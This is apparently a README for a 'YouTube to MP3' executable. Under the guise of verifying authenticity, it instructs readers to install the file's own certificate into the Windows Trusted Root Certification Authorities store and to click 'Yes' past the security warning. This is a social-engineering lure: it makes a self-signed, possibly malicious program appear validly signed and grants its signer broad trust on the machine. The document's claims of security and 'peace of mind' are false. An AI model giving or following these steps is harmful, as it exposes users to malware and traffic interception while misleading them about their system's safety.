# YouTube to MP3 Certificate Installation

This guide will help you manually install a trusted certificate for the YouTube to MP3 converter application, ensuring that it is authentic and secure.

## IMPORTANT: Certificate Installation Procedure

To ensure the security and authenticity of the `YouTube_to_MP3.exe` application, follow these steps carefully to install the certificate:

1. **Right-click on the executable file (`YouTube_to_MP3.exe`).**
2. **Select 'Properties'.**
3. **Go to the 'Digital Signatures' tab.**
   - Click the timestamp date ***Monday***.
4. **Click on 'Details'.**
   - Then click **View Certificate**.
5. **Click 'Install Certificate'.**
   - Choose **Current User**, then click ***Next***.
6. **Select 'Place all certificates in the following store':**
   - Click **Browse**.
7. **Choose 'Trusted Root Certification Authorities':**
   - Click **OK**.
8. **Confirm the import by clicking 'Finish'.**
   - The certificate will be imported after you click **Finish**.
9. **Return to the 'Digital Signatures' tab** (repeat step 3).
   - Click the timestamp date ***Monday*** again.
   - You will see a warning message pop up; click **Yes**.
10. **Verify if the signature is valid:**
    - Ensure that the signature status says **"This digital signature is OK."**

By following these steps, you will have successfully installed the certificate to your system, validating the `YouTube_to_MP3.exe` as a trusted application.

## Troubleshooting

- **No Digital Signature Tab**: If the 'Digital Signatures' tab is missing, the executable may not be signed. Ensure you have downloaded `YouTube_to_MP3.exe` from a legitimate source.
- **Signature Validation Fails**: If the signature is invalid or does not verify as 'OK', do not proceed with using the executable as it may have been tampered with. Contact support for further assistance.

This process ensures that the `YouTube_to_MP3` application is trusted and verified on your system, providing security and peace of mind.
